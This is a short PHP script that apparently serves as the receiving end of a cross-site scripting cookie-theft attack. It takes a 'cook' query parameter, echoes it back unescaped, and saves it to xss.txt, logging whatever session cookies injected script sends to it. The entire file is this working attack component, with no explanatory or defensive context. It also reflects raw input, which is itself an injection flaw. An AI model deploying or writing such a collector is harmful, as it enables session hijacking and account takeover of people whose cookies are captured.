<?php
$cook = isset($_GET['cook'])?$_GET['cook']:NULL;
print_r($cook);
file_put_contents("xss.txt",$cook);
?>